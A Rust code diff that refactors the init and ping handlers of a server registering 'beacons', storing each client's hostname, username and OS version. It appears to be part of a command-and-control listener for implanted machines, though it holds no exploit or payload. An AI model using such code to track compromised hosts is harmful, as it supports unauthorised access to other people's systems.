@@ -28,6 +28,49 @@ struct Beacon {
     os_version: Option<String>,
 }
 
+#[derive(Debug)]
+struct ProtocolMessage {
+    version: u32,
+    msg_type: u32,
+    fields: std::collections::HashMap<String, String>,
+}
+
+fn parse_protocol_message(data: &str) -> Option<ProtocolMessage> {
+    let mut lines = data.lines();
+    let mut message = ProtocolMessage {
+        version: 0,
+        msg_type: 0,
+        fields: std::collections::HashMap::new(),
+    };
+
+    // parse version
+    if let Some(version_line) = lines.next() {
+        if let Some(version_str) = version_line.strip_prefix("Version: ") {
+            message.version = version_str.parse().ok()?;
+        } else {
+            return None;
+        }
+    }
+
+    // parse type
+    if let Some(type_line) = lines.next() {
+        if let Some(type_str) = type_line.strip_prefix("Type: ") {
+            message.msg_type = type_str.parse().ok()?;
+        } else {
+            return None;
+        }
+    }
+
+    // parse fields
+    for line in lines {
+        if let Some((key, value)) = line.split_once(": ") {
+            message.fields.insert(key.to_string(), value.to_string());
+        }
+    }
+
+    Some(message)
+}
+
 async fn handle_init(
     State(state): State<Arc<AppState>>,
     body: Bytes,
@@ -35,56 +78,46 @@ async fn handle_init(
     let data = String::from_utf8_lossy(&body);
     tracing::info!("Received init data: {}", data);
 
-    if data.starts_with("INIT") {
-        let lines: Vec<&str> = data.lines().collect();
-        let client_id = lines[0]
-            .split_whitespace()
-            .nth(1)
-            .unwrap_or("unknown");
+    if let Some(message) = parse_protocol_message(&data) {
+        if message.msg_type == 2 { // PROTOCOL_MSG_INIT
+            let client_id = message.fields
+                .get("client_id")
+                .map(String::from)
+                .unwrap_or_else(|| "unknown".to_string());
+            let hostname = message.fields.get("hostname").cloned();
+            let username = message.fields.get("username").cloned();
+            let os_version = message.fields.get("os_version").cloned();
 
-        // Extract system information
-        let mut hostname = None;
-        let mut username = None;
-        let mut os_version = None;
+            // Create or update beacon with full information
+            let result = sqlx::query(
+                "INSERT INTO beacons (id, last_seen, status, hostname, username, os_version)
+                 VALUES (?, datetime('now'), 'active', ?, ?, ?)
+                 ON CONFLICT(id) DO UPDATE SET
+                 last_seen = datetime('now'),
+                 status = 'active',
+                 hostname = excluded.hostname,
+                 username = excluded.username,
+                 os_version = excluded.os_version"
+            )
+            .bind(client_id)
+            .bind(hostname)
+            .bind(username)
+            .bind(os_version)
+            .execute(&state.db)
+            .await;
 
-        for line in lines.iter().skip(1) {
-            if let Some((key, value)) = line.split_once(": ") {
-                match key {
-                    "HOSTNAME" => hostname = Some(value.to_string()),
-                    "USER" => username = Some(value.to_string()),
-                    "OS" => os_version = Some(value.to_string()),
-                    _ => {}
+            match result {
+                Ok(_) => (StatusCode::OK, "OK\n"),
+                Err(e) => {
+                    tracing::error!("Database error: {}", e);
+                    (StatusCode::INTERNAL_SERVER_ERROR, "Internal Server Error\n")
                 }
             }
-        }
-
-        // Create or update beacon with full information
-        let result = sqlx::query(
-            "INSERT INTO beacons (id, last_seen, status, hostname, username, os_version)
-             VALUES (?, datetime('now'), 'active', ?, ?, ?)
-             ON CONFLICT(id) DO UPDATE SET
-             last_seen = datetime('now'),
-             status = 'active',
-             hostname = excluded.hostname,
-             username = excluded.username,
-             os_version = excluded.os_version"
-        )
-        .bind(client_id)
-        .bind(hostname)
-        .bind(username)
-        .bind(os_version)
-        .execute(&state.db)
-        .await;
-
-        match result {
-            Ok(_) => (StatusCode::OK, "OK\n"),
-            Err(e) => {
-                tracing::error!("Database error: {}", e);
-                (StatusCode::INTERNAL_SERVER_ERROR, "Internal Server Error\n")
-            }
+        } else {
+            (StatusCode::BAD_REQUEST, "Invalid message type\n")
         }
     } else {
-        (StatusCode::BAD_REQUEST, "Invalid init format\n")
+        (StatusCode::BAD_REQUEST, "Invalid protocol format\n")
     }
 }
 
@@ -95,31 +128,35 @@ async fn handle_ping(
     let data = String::from_utf8_lossy(&body);
     tracing::info!("Received ping data: {}", data);
 
-    if data.starts_with("PING") {
-        let client_id = data
-            .split_whitespace()
-            .nth(1)
-            .unwrap_or("unknown");
+    if let Some(message) = parse_protocol_message(&data) {
+        if message.msg_type == 1 { // PROTOCOL_MSG_PING
+            let client_id = message.fields
+                .get("client_id")
+                .map(String::from)
+                .unwrap_or_else(|| "unknown".to_string());
 
-        // Only update last_seen time
-        let result = sqlx::query(
-            "UPDATE beacons
-             SET last_seen = datetime('now'), status = 'active'
-             WHERE id = ?"
-        )
-        .bind(client_id)
-        .execute(&state.db)
-        .await;
+            // Update last_seen time
+            let result = sqlx::query(
+                "UPDATE beacons
+                 SET last_seen = datetime('now'), status = 'active'
+                 WHERE id = ?"
+            )
+            .bind(client_id)
+            .execute(&state.db)
+            .await;
 
-        match result {
-            Ok(_) => (StatusCode::OK, "OK\n"),
-            Err(e) => {
-                tracing::error!("Database error: {}", e);
-                (StatusCode::INTERNAL_SERVER_ERROR, "Internal Server Error\n")
+            match result {
+                Ok(_) => (StatusCode::OK, "OK\n"),
+                Err(e) => {
+                    tracing::error!("Database error: {}", e);
+                    (StatusCode::INTERNAL_SERVER_ERROR, "Internal Server Error\n")
+                }
             }
+        } else {
+            (StatusCode::BAD_REQUEST, "Invalid message type\n")
         }
     } else {
-        (StatusCode::BAD_REQUEST, "Invalid ping format\n")
+        (StatusCode::BAD_REQUEST, "Invalid protocol format\n")
     }
 }
 
